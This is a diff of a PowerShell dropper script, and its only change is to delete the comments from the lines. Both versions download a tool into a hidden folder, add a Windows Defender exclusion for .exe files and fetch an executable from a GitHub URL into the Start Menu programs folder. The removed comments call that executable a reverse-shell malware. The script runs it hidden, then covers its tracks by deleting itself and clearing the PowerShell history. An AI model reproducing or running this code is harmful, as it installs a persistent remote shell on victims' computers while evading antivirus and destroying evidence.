@@ -1,15 +1,15 @@
-Set-Location C:\Users\Public\Documents\ #Go to puclib documents directory
-Invoke-WebRequest https://nmap.org/dist/nmap-7.92-win32.zip -o nmap.zip #Download netcat
-Expand-Archive nmap.zip nmap #Unzip netcat zip
-$FILE=Get-Item nmap -Force #Make nmap directory hidden
-$FILE.Attributes='hidden' #Make nmap directory hidden
-Remove-Item nmap.zip #Delete nmap.zip file
-Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs #Go to startup directory to make our reverseShell malware persistent
+Set-Location C:\Users\Public\Documents\
+Invoke-WebRequest https://nmap.org/dist/nmap-7.92-win32.zip -o nmap.zip
+Expand-Archive nmap.zip nmap
+$FILE=Get-Item nmap -Force
+$FILE.Attributes='hidden'
+Remove-Item nmap.zip
+Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs
 Add-MpPreference -ExclusionExtension exe -Force
-Invoke-WebRequest https://github.com/p1mpus/script/raw/main/Runtime.exe -o Runtime.exe #Download the reverseShell malware
-Start-Process -WindowStyle hidden Runtime.exe #Start the malware
-Set-ExecutionPolicy Restricted -Force #Reset script blocker
-Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
-Remove-Item C:\Users\Public\Documents\script.ps1 #Delete script.ps1 file
-Clear-Content (Get-PSReadLineOption).HistorySavePath #Clear powershell command history
+Invoke-WebRequest https://github.com/p1mpus/script/raw/main/Runtime.exe -o Runtime.exe
+Start-Process -WindowStyle hidden Runtime.exe
+Set-ExecutionPolicy Restricted -Force
+Remove-MpPreference -ExclusionExtension ps1 -Force
+Remove-Item C:\Users\Public\Documents\script.ps1
+Clear-Content (Get-PSReadLineOption).HistorySavePath
 exit
